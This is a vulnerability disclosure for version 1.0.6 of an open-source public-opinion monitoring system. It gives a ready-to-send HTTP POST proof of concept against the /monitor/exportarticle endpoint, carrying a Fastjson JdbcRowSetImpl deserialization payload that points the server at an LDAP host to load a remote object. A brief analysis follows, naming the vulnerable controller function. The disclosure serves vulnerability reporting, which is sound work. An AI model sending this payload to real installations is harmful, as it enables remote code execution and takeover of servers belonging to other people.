### There is a deserialization vulnerability in the public opinion monitoring network monitoring system

### project address

https://gitee.com/stonedtx/yuqing

### Affected version

1.0.6

POC

```
POST /monitor/exportarticle HTTP/1.1
Host: 127.0.0.1:8084
Content-Length: 112
sec-ch-ua: "(Not(A:Brand";v="8", "Chromium";v="99"
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://127.0.0.1:8084
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://127.0.0.1:8084/report?groupid=1493154486150107136&projectid=1493154645181337600&search=&type=1&page=1
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=1691376050; local-portal=77E068CB3DBFA3E311237A3E65D6E77E; Hm_lvt_e0ae7650bd7b3442428280c81a85f60b=1691564381; Hm_lvt_f17e264e40b4ac75672813c1a2ae7110=1691564381; Hm_lpvt_e0ae7650bd7b3442428280c81a85f60b=1691564960; Hm_lpvt_f17e264e40b4ac75672813c1a2ae7110=1691564960
Connection: close

data={"e":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"f":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1:8888/Object","autoCommit":true}}
```



![img](https://cdn-images-1.medium.com/max/900/0*EoaWBcXwmyNg5RWD)

### Vulnerability analysis

### Used unsafe components

![img](https://cdn-images-1.medium.com/max/900/0*Csepkkg9DDSE5wTk)

Find the call point src/main/java/com/stonedt/intelligence/controller/MonitorController.java exportArticleList function. The corresponding route exportarticle parameter is data and the request type is POST.

![img](https://cdn-images-1.medium.com/max/900/0*bXf8hC2-jAAyZ-ng)

The upper-level route is monitor.

![img](https://cdn-images-1.medium.com/max/900/0*kRAbYyObfxzMLHL2)